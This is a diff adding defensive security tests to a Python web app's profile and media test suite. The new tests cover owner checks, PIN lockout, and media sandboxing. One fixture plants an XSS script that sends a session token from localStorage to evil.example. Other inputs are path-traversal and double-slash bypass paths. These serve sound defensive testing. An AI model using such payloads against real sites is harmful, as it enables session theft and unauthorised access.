@@ -292,7 +292,7 @@ class ProfileSecurityTests(unittest.TestCase):
 
     def test_pin_change_and_sign_out_everywhere_revoke_tokens(self) -> None:
         old = self._headers("alice", "2468")
-        changed = self.client.patch("/profiles/alice", json={"pin": "9753"}, headers=old)
+        changed = self.client.patch("/profiles/alice", json={"pin": "9753", "current_pin": "2468"}, headers=old)
         self.assertEqual(changed.status_code, 200, changed.text)
         self.assertEqual(self.client.get("/profiles/session", headers=old).status_code, 401)
         fresh = {"Authorization": f"Bearer {changed.json()['session']['token']}"}
@@ -348,12 +348,21 @@ class ProfileSecurityTests(unittest.TestCase):
         media = TestClient(server.app, cookies={server._MEDIA_COOKIE: token})
         self.assertEqual(media.get("/media/run-1/video.mp4").status_code, 200)
         self.assertEqual(media.get("/media/computer-use/alice/s1/shot.png").content, b"computer-use/alice/s1/shot.png")
+        (self.media_root / "phone-use/bob/t1").mkdir(parents=True)
+        (self.media_root / "phone-use/bob/t1/x.png").write_bytes(b"bob phone")
         for foreign in (
             "/media/computer-use/bob/s1/shot.png",
             "/media/Computer-Use/BOB/s1/shot.png",
             "/media/computer-use/alice/../bob/s1/shot.png",
+            # StaticFiles drops empty segments; the owner check must too.
+            "/media//computer-use/bob/s1/shot.png",
+            "/media///computer-use/bob/s1/shot.png",
+            "/media//phone-use/bob/t1/x.png",
+            "/media/./computer-use/bob/s1/shot.png",
+            "/media/computer-use//bob/s1/shot.png",
         ):
             self.assertEqual(media.get(foreign).status_code, 404, foreign)
+        self.assertEqual(media.get("/media//computer-use/alice/s1/shot.png").status_code, 200)
         # The ambient cookie authenticates media reads only, never the API.
         self.assertEqual(media.get("/threads/latest").status_code, 401)
         self.assertEqual(media.post("/profiles/invites").status_code, 401)
@@ -361,6 +370,157 @@ class ProfileSecurityTests(unittest.TestCase):
         closed = self.client.delete("/profiles/media-session")
         self.assertEqual(closed.status_code, 200)
         self.assertIn(f'{server._MEDIA_COOKIE}=""', closed.headers["set-cookie"])
+
+    def test_media_is_sandboxed_and_downloads_never_render(self) -> None:
+        page = self.media_root / "run-1" / "page.html"
+        download = self.media_root / "computer-use" / "alice" / "s1" / "downloads" / "invoice.html"
+        for target in (page, download):
+            target.parent.mkdir(parents=True, exist_ok=True)
+            target.write_text("<script>fetch('https://evil.example/?'+localStorage.narad_profile_session)</script>")
+        token = self._login("alice", "2468")["token"]
+        media = TestClient(server.app, cookies={server._MEDIA_COOKIE: token})
+
+        rendered = media.get("/media/run-1/page.html")
+        self.assertEqual(rendered.status_code, 200)
+        # Scripts run only in an opaque origin: never with this app's storage.
+        self.assertEqual(rendered.headers["content-security-policy"], "sandbox allow-scripts")
+        self.assertEqual(rendered.headers["x-content-type-options"], "nosniff")
+        self.assertNotIn("content-disposition", rendered.headers)
+        fetched = media.get("/media/computer-use/alice/s1/downloads/invoice.html")
+        self.assertEqual(fetched.status_code, 200)
+        self.assertEqual(fetched.headers["content-disposition"], "attachment")
+        self.assertIn("sandbox", fetched.headers["content-security-policy"])
+
+    # ── 8. Review fixes: owner guards in every mode, PIN custody, lockout ────
+
+    def test_profile_sessions_need_the_owner_outside_strict_mode_too(self) -> None:
+        relayed = TestClient(server.app, client=("127.0.0.1", 50000))
+        proxy = {"X-Forwarded-For": "100.101.102.103", "X-Forwarded-Proto": "https"}
+        with patch.object(server, "_AUTH_MODE", "local"), \
+             patch("kunji.delete_key", return_value=True) as delete_key:
+            self.assertEqual(relayed.get("/threads/latest", headers=proxy).status_code, 401)
+            bob = {**proxy, **self._headers("bob", "1357")}
+            denied = [
+                relayed.post("/interaction-targets", json={"kind": "cua", "external_id": "host"}, headers=bob),
+                relayed.post("/connections", json={"key": "", "provider": "openai"}, headers=bob),
+                relayed.delete("/connections/openai", headers=bob),
+                relayed.post("/tiers/choice", json={"tier": "T1"}, headers=bob),
+            ]
+            self.assertEqual([response.status_code for response in denied], [403] * len(denied))
+            delete_key.assert_not_called()
+            self.assertEqual(self.client.get("/interaction-targets", headers=self._headers("bob", "1357")).json()["targets"], [])
+
+            owner = {**proxy, **self._headers("default", "8642")}
+            granted = relayed.post(
+                "/interaction-targets",
+                json={"kind": "cua", "external_id": "host", "profile_id": "bob"},
+                headers=owner,
+            )
+            self.assertEqual(granted.status_code, 200, granted.text)
+            # The host itself (loopback, no relay headers) keeps its trusted path.
+            local = relayed.post("/interaction-targets", json={"kind": "cua", "external_id": "host-2"})
+            self.assertEqual(local.status_code, 200, local.text)
+
+    def test_local_model_and_key_tests_are_owner_only(self) -> None:
+        runtime = type("Runtime", (), {
+            "start_install": lambda self: {"ready": False, "install": {"state": "running"}},
+            "ensure_server": lambda self, timeout=None: {"ready": False},
+        })()
+        alice = self._headers("alice", "2468")
+        with patch("local_model_runtime.get_local_model_runtime", return_value=runtime), \
+             patch("kunji.test_key", return_value=(True, "ok")) as test_key:
+            self.assertEqual(self.client.post("/local-model/install", headers=alice).status_code, 403)
+            self.assertEqual(self.client.post("/local-model/start", headers=alice).status_code, 403)
+            self.assertEqual(self.client.post("/connections/openai/test", headers=alice).status_code, 403)
+            test_key.assert_not_called()
+            owner = self._headers("default", "8642")
+            self.assertEqual(self.client.post("/local-model/install", headers=owner).status_code, 202)
+            self.assertEqual(self.client.post("/local-model/start", headers=owner).status_code, 200)
+            self.assertEqual(self.client.post("/connections/openai/test", headers=owner).json()["ok"], True)
+
+    def test_owner_pin_has_one_lockout_bucket(self) -> None:
+        # An empty id is no alias for the owner: it never checks the owner's PIN.
+        empty = self.client.post("/profiles/login", json={"user_id": "", "pin": "8642"})
+        self.assertEqual(empty.status_code, 401)
+        for index in range(server._LOGIN_PROFILE_THRESHOLD):
+            spelling = ("default", " DEFAULT ", "Default")[index % 3]
+            self.client.post("/profiles/login", json={"user_id": spelling, "pin": "0000"})
+            server._login_failures.pop("ip:testclient", None)  # as if from fresh IPs
+        locked = self.client.post("/profiles/login", json={"user_id": "default", "pin": "8642"})
+        self.assertEqual(locked.status_code, 429)
+        profile_keys = {key for key in server._login_failures if key.startswith("profile:")}
+        self.assertEqual(profile_keys, {"profile:default"})
+
+    def test_login_table_is_bounded_and_ipv6_is_keyed_per_64(self) -> None:
+        with patch.object(server, "_LOGIN_TABLE_LIMIT", 8):
+            server._login_failures["profile:alice"] = (2, 0.0)
+            for index in range(40):
+                self.client.post(
+                    "/profiles/login",
+                    json={"user_id": f"random-{index}", "pin": "0000"},
+                    headers={"CF-Connecting-IP": f"2001:db8:{index:x}::1"},
+                )
+            self.assertLessEqual(len(server._login_failures), 8)
+            self.assertFalse([key for key in server._login_failures if key.startswith("profile:random")])
+            self.assertEqual(server._login_failures["profile:alice"], (2, 0.0))  # never evicted
+
+        server._login_failures.clear()
+        for suffix in range(server._LOGIN_IP_THRESHOLD):
+            self.client.post(
+                "/profiles/login",
+                json={"user_id": "nobody", "pin": "0000"},
+                headers={"CF-Connecting-IP": f"2001:db8:1:2::{suffix + 1:x}"},
+            )
+        same_subnet = self.client.post(
+            "/profiles/login", json={"user_id": "alice", "pin": "2468"}, headers={"CF-Connecting-IP": "2001:db8:1:2::ffff"}
+        )
+        self.assertEqual(same_subnet.status_code, 429)
+        self.assertEqual(server._throttle_address("::ffff:198.51.100.7"), "198.51.100.7")
+
+    def test_public_profile_paths_match_the_method_and_reserved_ids(self) -> None:
+        member = family_profiles.create_profile("Login", "1234")
+        self.assertNotEqual(member["user_id"], "login")
+        # A legacy registry may already hold the id; the gate must still hold.
+        registry = json.loads(family_profiles.FAMILY_PROFILES_PATH.read_text(encoding="utf-8"))
+        registry["profiles"]["login"] = {**registry["profiles"][member["user_id"]], "user_id": "login"}
+        family_profiles.FAMILY_PROFILES_PATH.write_text(json.dumps(registry), encoding="utf-8")
+        for path in ("/profiles/login", "/profiles/bootstrap"):
+            hijack = self.client.patch(path, json={"pin": "0000", "display_name": "pwned"})
+            self.assertEqual(hijack.status_code, 401, path)
+        self.assertFalse(family_profiles.verify_pin("login", "0000"))
+        anonymous = SimpleNamespace(state=SimpleNamespace(profile_authenticated=False, host_authority=False))
+        with self.assertRaises(HTTPException) as denied:
+            server._assert_profile_match(anonymous, "alice")
+        self.assertEqual(denied.exception.status_code, 401)
+
+    def test_pin_change_needs_the_current_pin_and_owner_can_reset(self) -> None:
+        stolen = self._headers("alice", "2468")
+        for body in ({"pin": "0000"}, {"pin": "0000", "current_pin": "1111"}):
+            refused = self.client.patch("/profiles/alice", json=body, headers=stolen)
+            self.assertEqual(refused.status_code, 403, body)
+        self.assertTrue(family_profiles.verify_pin("alice", "2468"))
+        self.assertEqual(self.client.get("/profiles/session", headers=stolen).status_code, 200)
+        renamed = self.client.patch("/profiles/alice", json={"display_name": "Alice R"}, headers=stolen)
+        self.assertEqual(renamed.status_code, 200, renamed.text)
+
+        bob = self._headers("bob", "1357")
+        self.assertEqual(self.client.post("/profiles/alice/reset-pin", json={"pin": "5555"}, headers=bob).status_code, 403)
+        owner = self._headers("default", "8642")
+        self.assertEqual(self.client.post("/profiles/default/reset-pin", json={"pin": "5555"}, headers=owner).status_code, 400)
+        self.assertEqual(self.client.post("/profiles/nobody/reset-pin", json={"pin": "5555"}, headers=owner).status_code, 404)
+        reset = self.client.post("/profiles/alice/reset-pin", json={"pin": "5555"}, headers=owner)
+        self.assertEqual(reset.status_code, 200, reset.text)
+        self.assertNotIn("session", reset.json())
+        self.assertEqual(self.client.get("/profiles/session", headers=stolen).status_code, 401)
+        self._login("alice", "5555")
+
+    def test_bootstrap_refusal_names_the_host_address(self) -> None:
+        family_profiles.FAMILY_PROFILES_PATH.unlink()
+        tunnelled = self.client.post(
+            "/profiles/bootstrap", json={"user_id": "default", "pin": "8642"}, headers={"CF-Connecting-IP": "198.51.100.4"}
+        )
+        self.assertEqual(tunnelled.status_code, 403)
+        self.assertIn("http://127.0.0.1:", tunnelled.json()["detail"])
 
 
 if __name__ == "__main__":
